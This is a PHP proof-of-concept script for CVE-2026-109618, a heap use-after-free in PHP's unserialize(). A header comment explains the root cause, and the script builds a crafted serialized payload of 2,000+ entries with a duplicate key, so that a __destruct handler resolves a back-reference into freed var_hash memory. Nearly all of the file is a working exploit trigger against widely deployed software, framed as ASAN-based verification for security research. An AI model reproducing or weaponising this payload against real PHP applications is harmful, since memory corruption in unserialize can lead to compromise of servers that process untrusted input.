<?php
/**
 * CVE-2026-109618 -- var_destroy UAF verification
 *
 * Triggers heap-use-after-free in php_var_unserialize (var_unserializer.c:851).
 * Must be run with an ASAN-instrumented PHP build (see Dockerfile.asan).
 *
 * Root cause: var_destroy() frees back-reference extension chunks via
 * efree() at line 245, then i_zval_ptr_dtor at line 310 fires __destruct
 * WITHOUT holding BG(serialize_lock). The __destruct handler calls
 * unserialize('R:1500;') which resolves a back-reference into the
 * already-freed var_hash extension chunk.
 *
 * Trigger mechanism:
 *   - Build array with 2000+ entries to overflow VAR_ENTRIES_MAX (1018)
 *   - This forces allocation of extension chunks in var_hash
 *   - Duplicate key (i:99999) moves TriggerUAF object to dtor list
 *   - var_destroy frees extension chunks, then fires __destruct
 *   - Inner unserialize('R:1500;') reads from freed memory
 *
 * Run: USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php verify_uaf.php
 * For authorized security research only.
 */

class TriggerUAF {
    public function __destruct() {
        fwrite(STDERR, "[*] __destruct fired (serialize_lock=0)\n");
        fwrite(STDERR, "[*] Attempting R:1500 backref into freed var_hash chunk...\n");
        $result = @unserialize('R:1500;');
        $type = gettype($result);
        fwrite(STDERR, "[*] R:1500 resolved to type: $type\n");
        if ($result !== false) {
            fwrite(STDERR, "[+] UAF CONFIRMED: R:1500 read from freed memory\n");
        }
    }
}

$N = 2000;
$payload = 'a:' . ($N + 2) . ':{';
for ($i = 0; $i < $N; $i++) {
    $payload .= "i:$i;i:$i;";
}
$payload .= 'i:99999;O:10:"TriggerUAF":0:{}';
$payload .= 'i:99999;i:42;';
$payload .= '}';

fwrite(STDERR, "[*] Payload: " . strlen($payload) . " bytes, $N entries + trigger\n");
fwrite(STDERR, "[*] Firing unserialize()...\n");

@unserialize($payload);

fwrite(STDERR, "[*] Done.\n");
fwrite(STDERR, "[*] If ASAN reported heap-use-after-free, the UAF is confirmed.\n");
fwrite(STDERR, "[*] Expected trace:\n");
fwrite(STDERR, "    READ at php_var_unserialize (var_unserializer.c:851)\n");
fwrite(STDERR, "    freed at var_destroy (var_unserializer.c:245)\n");
